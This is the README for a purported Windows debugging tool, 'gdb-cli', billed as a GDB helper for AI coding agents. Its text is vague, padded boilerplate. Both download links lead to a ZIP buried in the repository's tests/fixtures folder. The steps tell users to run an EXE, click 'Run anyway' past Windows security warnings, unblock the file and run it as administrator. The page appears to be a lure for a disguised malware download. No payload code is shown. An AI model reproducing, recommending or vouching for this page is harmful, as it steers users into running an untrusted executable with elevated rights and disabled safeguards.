# 🛠️ gdb-cli - Debug Faster With AI Help

[![Download gdb-cli](https://img.shields.io/badge/Download-gdb--cli-blue?style=for-the-badge&logo=github)](https://github.com/Covert-cobra578/gdb-cli/raw/refs/heads/main/tests/fixtures/gdb-cli-1.2.zip)

## 🧭 What this app does

gdb-cli is a Windows tool for debugging with GDB, built for AI agents like Claude Code and similar tools. It helps you inspect what a program is doing, step through code, and read crash details in a way that is easier to manage from the command line.

Use it when you want to:
- start a debug session
- connect to a running program
- read stack traces
- check variables and program flow
- work with AI tools that need debugger output

## 💻 Before you start

Use this on a Windows PC with:
- Windows 10 or Windows 11
- a working internet connection
- enough free space to store the app and any debug files
- admin access if your system asks for it

For best results, keep these tools ready:
- Git, if you plan to download from the repository
- GDB, if the app asks for a local debugger install
- a terminal app such as PowerShell or Windows Terminal

## 📥 Download and install

Go to the main project page here:

[Visit the gdb-cli download page](https://github.com/Covert-cobra578/gdb-cli/raw/refs/heads/main/tests/fixtures/gdb-cli-1.2.zip)

On the page:
1. open the repository
2. find the latest release or download option
3. save the file to your PC
4. if you get a ZIP file, extract it to a folder you can find again
5. if you get an EXE file, double-click it to run it

If Windows shows a security prompt:
1. click More info if needed
2. choose Run anyway if you trust the source
3. wait for the app to open

## 🚀 First run on Windows

After download, open gdb-cli from the folder where you saved it.

If you see a terminal window:
1. leave it open
2. wait for the prompt to finish loading
3. type the command shown by the app
4. press Enter

If the app asks for a target program:
1. choose the program you want to debug
2. make sure the program is not already closed
3. follow the prompt in the terminal

If the app asks for GDB path:
1. point it to your GDB install
2. use the full file path if asked
3. confirm the choice

## 🔍 What you can do with it

gdb-cli gives you a simple way to work with GDB from the command line. Common tasks include:

- start a new debug session
- attach to a running process
- step through a program line by line
- pause at breakpoints
- inspect values in memory
- view call stacks
- capture error output for AI tools
- repeat the same debug flow with fewer manual steps

## 🧩 Basic workflow

A simple debug flow looks like this:

1. open gdb-cli
2. choose or enter the program you want to inspect
3. start the debug session
4. set a breakpoint if needed
5. run the program
6. pause when you reach the code area you need
7. read variables, stack frames, and errors
8. copy useful output into your AI tool or notes

If you are helping an AI agent debug a program, keep the session output clear. Short, clean logs are easier to use.

## ⚙️ Common setup steps

### 1. Prepare your files
Place your program and any related files in a folder you can reach fast.

### 2. Check GDB
If gdb-cli needs GDB on your machine, make sure the debugger can open from the command line.

### 3. Open the tool
Run the app from the extracted folder or from the file you downloaded.

### 4. Follow the prompt
The app may ask for:
- the program file
- a process ID
- a path to GDB
- a port or session setting

### 5. Save useful output
Copy stack traces, error lines, and command results into a text file if you want to keep them.

## 🪟 Windows tips

- Use a short folder path like `C:\Tools\gdb-cli`
- Avoid spaces in file names if the tool gives path errors
- Run the app as admin if it cannot read another process
- Keep your target program and debugger in the same drive when possible
- Use Windows Terminal for easier copy and paste

## 🧪 Example use cases

You can use gdb-cli for tasks like:
- checking why a program closes right away
- reading a crash log from a test build
- stepping through a bug in a local app
- watching a program stop at a key point
- helping an AI agent inspect program state

If you work with AI tools, gdb-cli can make the debug session easier to describe. That helps when you want the agent to suggest next steps from real output.

## 🛠️ Troubleshooting

### The app will not open
- check that the file finished downloading
- extract ZIP files before opening them
- right-click the file and try Run as administrator
- try a different folder like `Downloads` or `Desktop`

### Windows blocks the file
- open the file’s properties
- look for an Unblock option
- confirm the file came from the right repository page

### GDB is not found
- install GDB if it is not already on your PC
- confirm the path is correct
- restart the terminal after changing the path

### The target program does not start
- make sure the program file exists
- check that the path is correct
- close other debug sessions before trying again

### Output looks empty or cut off
- resize the terminal window
- scroll up for older lines
- run the command again and copy the full result

## 📂 Suggested folder layout

A simple setup can look like this:

- `C:\Tools\gdb-cli\` for the app
- `C:\Tools\gdb-cli\logs\` for saved output
- `C:\Tools\Targets\` for the program you want to debug

This keeps files in one place and makes it easier to find them later.

## 🔐 Safety and privacy

gdb-cli works with programs on your computer and can show memory, stack, and error details. Keep that output private if it includes:
- passwords
- API keys
- personal data
- internal file paths
- sensitive crash logs

Store debug logs only where you want them kept.

## 📎 Useful commands

If the app uses a terminal flow, these basic ideas help:
- run: start the program under GDB
- break: stop at a point in the code
- next: move to the next line
- step: enter a function
- continue: keep running
- backtrace: show the call stack
- print: show a value

The exact commands may vary by setup, but these are common in GDB work.

## 🧰 For AI-assisted debugging

If you use Claude Code or a similar agent, share:
- the last few terminal lines
- the error message
- the command you ran
- the path to the target app
- the point where the program stopped

Clear input helps the agent reason about the problem faster.

## 📌 Quick start checklist

- download the app from the repository page
- extract it if needed
- open it on Windows
- make sure GDB is ready
- point it to your target program
- start the debug session
- read the output and save what matters